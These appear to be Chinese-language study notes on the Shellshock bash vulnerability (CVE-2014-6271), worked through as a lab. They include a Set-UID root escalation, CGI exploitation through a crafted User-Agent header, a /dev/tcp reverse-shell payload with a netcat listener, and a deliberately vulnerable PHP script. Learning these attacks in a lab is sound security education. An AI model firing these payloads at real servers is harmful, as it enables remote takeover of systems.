# 第三章 Shellshock 攻击

shellshock 漏洞：CVE-2014-6271
利用了 bash 将环境变量转换为函数定义时犯的一个错误

shellshock 漏洞要求的两个条件

1. Bash 调用
2. 传入用户数据作为环境变量

## Shellshock 漏洞

bash version 4.1.0 -> bash_shellshock

获得含有 ShellShock 漏洞的 bash 4.1.0 版本：

`$wget http://labfile.oss.aliyuncs.com/bash-4.1.tar.gz`

```sh
yuan@ubuntu:~/Cap3-shellshock$ foo='() { echo "hello"; }; echo "extra";'
yuan@ubuntu:~/Cap3-shellshock$ echo $foo
() { echo "hello"; }; echo "extra";
yuan@ubuntu:~/Cap3-shellshock$ export foo
yuan@ubuntu:~/Cap3-shellshock$ bash_shellshock
extra
yuan@ubuntu:~/Cap3-shellshock$ echo $foo

yuan@ubuntu:~/Cap3-shellshock$ declare -f foo
foo ()
{
    echo "hello"
}
```

bash 源代码中的错误 variables.c

`void initialize_shell_variables(env, privmode)`

bash 检查环境变量是否以`() {`开头，一旦发现这样的字符串，Bash 将用'='替换空格使该环境变量变成一个函数定义，
然后，bash 调用`parse_and_execute()`函数解析该函数定义。然而，`parse_and_execute()`的功能太强大，
他不仅仅解析函数定义，还解析和运行其他 shell 指令。如果该字符串包含用分号隔开的多个指令，
`parse_and_execute()`会解析和运行每一条

## 利用 shellshock 攻击 Set-UID 程序

_有漏洞的程序_:vul.c

```C
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char const *argv[])
{
	setuid(geteuid());
	system("/bin/ls -l");
	return 0;
}
```

    	只有真实用户ID和有效用户ID相同时，Bash才会从环境变量中获得函数定义

`$ sudo ln -sf /bin/bash_shellshock /bin/sh`

```sh
yuan@ubuntu:~/Cap3-shellshock$ gcc -o vul.out vul.c
yuan@ubuntu:~/Cap3-shellshock$ sudo chown root vul.out
yuan@ubuntu:~/Cap3-shellshock$ sudo chmod 4755 vul.out
yuan@ubuntu:~/Cap3-shellshock$ export foo='() { echo hello; }; /bin/sh'
yuan@ubuntu:~/Cap3-shellshock$ ./vul.out
sh-4.1# id
uid=0(root) gid=1000(yuan) 组=1000(yuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

## 利用 shellshock 攻击 CGI 程序

CGI (coomon gateway interface, 通用网关接口) 是被 Web 服务器生成动态网页的可执行程序， 许多 cgi 程序是 shell 脚本

### 1 环境准备

启动 apache2 服务， 将 test.cgi 放到/usr/lib/cgi-bin/文件夹内.
将 test.cgi 改成 755 可执行权限。

test.cgi

```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo
echo "Hello"
```

用 kali linux 访问

```sh
kali@kali:~Desktop$ curl http://192.168.43.240/cgi-bin/test.cgi

Hello
kali@kali:~Desktop$
```

### web 服务器调用 CGI 程序

`curl -v`会打印出 HTTP 请求和服务器响应

通过远程访问 test2.cgi 可以知道，Apache 服务器从 HTTP 请求头中获得 User-Agent 信息，并将他赋值给一个*HTTP_USER_AGENT*的环境变量
当 Apache 服务创建一个子进程来执行 CGI 程序时，会传递该变量以及一些其他的环境变量给 CGI 程序

```sh
yuan@ubuntu:~$ curl -v http://192.168.43.240/cgi-bin/test.cgi
*   Trying 192.168.43.240...
* TCP_NODELAY set
* Connected to 192.168.43.240 (192.168.43.240) port 80 (#0)
> GET /cgi-bin/test.cgi HTTP/1.1
> Host: 192.168.43.240
> User-Agent: curl/7.58.0	      	    <****注意这里
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sat, 19 Dec 2020 07:29:39 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
<
** Enviroment Variables **
HTTP_HOST=192.168.43.240
HTTP_USER_AGENT=curl/7.58.0            <****注意这里
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

...

```

利用*User-Agent*实现攻击

```sh
kali@kali:$ curl -A "() { ;}; echo Content-Type: text/plain; /bin/ls -l" http://192.168.43.240/cgi-bin/test.cgi
```

> /bin/ls -l 可换成任意希望执行的指令

### 创建反向 shell

```sh
Attacker:$ nc -l -p 9090 -v
Attacker:$ curl -A "() { ;}; echo Content-Type: text/plain; echo;
echo; /bin/bash -i > /dev/tcp/192.168.43.230/9090 0<&1 2>&1" http://192.168.43.240/cgi-bin/test.cgi

```

创建反向 shell 指令：

```sh
Server:$ /bin/bash -i > /dev/tcp/192.168.43.230/9090 0<&1 2>&1
```

    -i shell的可交互模式
    >/dev/tcp/_ip_/_port_ shell输出重定向至TCP连接，stdout的文件描述符是1
    0<&1 0:stdin 将标准输出设备也用作输入 TCP是一个双向连接
    2>&1 2:stderr

## 针对 PHP 的远程攻击

触发 shellshock 漏洞需要满足的条件：

1. Bash 调用
   PHP 中的 system()函数，可以用它来执行外部命令
2. 传入用户数据作为环境变量
   在 Apache 服务器中，PHP 可以通过三种方式运行

   - Apache 组件
   - CGI (以 CGI 运行 php 可以满足)
   - FastCGI (不能满足条件， 但是在调用 system()函数之前，PHP 程序根据用户输入设置了环境变量，那么还是存在 shellshock 漏洞的)

```php
<?php
    function getParam()
    {
        $arg = NULL;
        if ((isset($_GET["arg"])) && !empty($_GET["arg"]))
        {
            $arg = $_GET["arg"];
        }
        return $arg;
    }
    $arg = getParam(); // 从用户输入的参数中获得一个参数
    putenv("ARG=$arg"); // 把这个参数放在一个叫ARG的环境变量中
    system("string /proc/$$/environ | grep ARG"); // 调用system()函数
?>
```
